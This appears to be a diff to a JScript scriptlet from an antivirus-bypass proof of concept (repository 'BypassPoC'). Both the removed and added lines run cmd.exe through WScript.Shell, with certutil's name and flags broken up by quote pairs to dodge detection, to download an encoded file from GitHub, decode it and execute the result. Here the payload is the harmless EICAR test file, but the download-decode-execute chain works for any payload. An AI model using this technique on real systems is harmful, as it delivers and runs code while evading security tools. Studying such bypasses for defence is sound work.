@@ -14,7 +14,7 @@
 	<script language="JScript">
 		<![CDATA[
 	  
-			var r = new ActiveXObject("WScript.Shell").Run(cmd.exe copy %windir%\system32\c""e""r""t""u""t""i""l.exe %temp%\t""c""m.tmp && cd %temp% && t""c""m.tmp ""-u""r""l""c""a""c""h""e"" ""-s""p""l""i""t"" ""-f"" https://raw.githubusercontent.com/pjcampbe11/BypassPoC/master/EncodedEicarCertificate.txt && ""t""c""m.tmp ""-d""e""c""o""d""e"" EncodedEicarCertificate.txt eicar.com && eicar.com);	
+			var r = new ActiveXObject("WScript.Shell").Run(cmd.exe c""e""r""t""u""t""i""l.exe -u""r""l""c""a""c""h""e -s""p""l""i""t -f https://raw.githubusercontent.com/pjcampbe11/BypassPoC/master/EncodedEicarCertificate.txt && c""e""r""t""u""t""i""l.exe -d""e""c""o""d""e EncodedEicarCertificate.txt eicar.com && eicar.com);	
 	
 		]]>
 </script>
